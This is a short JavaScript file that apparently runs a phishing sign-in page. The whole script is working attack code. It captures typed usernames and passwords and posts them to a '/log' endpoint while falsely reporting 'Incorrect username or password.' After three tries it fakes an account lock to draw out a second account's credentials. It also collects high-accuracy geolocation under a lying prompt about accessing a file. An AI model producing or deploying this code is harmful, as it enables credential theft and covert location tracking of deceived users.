let username = document.querySelector("body > div > div.signin-block > div > form > input:nth-child(1)")
let password = document.querySelector("body > div > div.signin-block > div > form > input:nth-child(2)")
let button = document.querySelector("#button1")

let attempts = 0

function logLocation() {
  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(position => {
      let reqData = {
        logType: "geolocation",
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        acc: position.coords.accuracy
      }
      log(reqData)
    }, console.log, {enableHighAccuracy: true})
  } else {
    alert("You need to allow location to access this file")
  }
}

function logSigninAttempt(event) {
  event.preventDefault()
  if(attempts >= 3) {
    alert("This account has been temporarily locked. Try a different account.")
    username.value = ""
    password.value = ""
    return
  }
  reqData = {
    logType: "sign-in",
    username: username.value,
    password: password.value
  }
  log(reqData)
}

function log(reqData) {
  fetch(`/log`, {
      method: "POST",
      headers: {'Content-Type': 'application/json'}, 
      body: JSON.stringify(reqData)
  }).then(res => {
      return res.json()
  }).then(res => {
      if(reqData.logType == "sign-in") {
        alert("Incorrect username or password.")
        attempts++
      }
  }).catch(err => {
    alert(err)
  })
}

button.addEventListener('click', event => logSigninAttempt(event))
logLocation()
